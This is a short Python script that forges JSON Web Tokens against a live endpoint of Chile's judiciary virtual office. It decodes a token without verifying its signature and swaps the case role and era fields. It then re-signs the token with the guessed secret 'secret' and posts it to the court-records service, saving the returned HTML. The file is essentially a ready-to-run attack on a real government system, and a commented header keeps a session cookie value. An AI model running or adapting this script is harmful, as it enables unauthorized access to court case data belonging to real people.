import jwt
import requests


class JWTManager:
    def __init__(self, raw_jwt):
        self.original_jwt = raw_jwt.split("'")[1]
        print(f"[*] JWT Manager initialized...")
        # print(f"Original JWT: {case_jwt_encoded}")

    def decoder(self):
        print(f"[*] JWT Manager decoding...")
        # Decode JWT
        jwt_options = {
            "verify_signature": False
        }
        self.decoded_jwt = jwt.decode(
            self.original_jwt,
            algorithms=["HS256"],
            options=jwt_options
        )
        # print(f"Decoded JWT: {case_jwt_decoded}")  # dict

    def modify(self, rol: str, era: str):
        print(f"[*] JWT Manager modifying JWT payload...")
        # Modify JWT data
        self.decoded_jwt["data"]["rolCausa"] = rol
        self.decoded_jwt["data"]["eraCausa"] = era

        # print(f"Modified JWT: {case_jwt_decoded}")  # dict

    def encode(self):
        print(f"[*] JWT Manager encoding new JWT request...")
        self.encoded_jwt = jwt.encode(
            self.decoded_jwt,
            "secret",
            algorithm="HS256",
        )
        self.encoded_jwt
        # print(f"Modifiend Encoded JWT: {encoded_jwt}")

    def request(self):
        SEARCH_URL = "https://oficinajudicialvirtual.pjud.cl/ADIR_871/apelaciones/modal/causaApelaciones.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0",
            "Host": "oficinajudicialvirtual.pjud.cl",
            "Accept": "text/html, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            # "Content-Length": "926",
            "Origin": "https://oficinajudicialvirtual.pjud.cl",
            "Connection": "keep-alive",
            "Referer": "https://oficinajudicialvirtual.pjud.cl/indexN.php",
            # "Cookie": "PHPSESSID=a3be543fe833dcc822e280eac807ff26; TS01262d1d=01b485afe585660d4c67014dbae081e834d7645796134f6239f97c548a3073e914ee141716aed35ac89f551655597512bdb5ed472ea4890221933232314529c1b5d4c1d0ba",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        payload = f"dtaCausa=('{self.encoded_jwt}')"
        print(f"[*] Sending new JWT request!")
        response = requests.post(SEARCH_URL, headers=headers, data=payload)
        html = response.text

        with open("example.html", "w") as file:
            file.write(html)

        return html
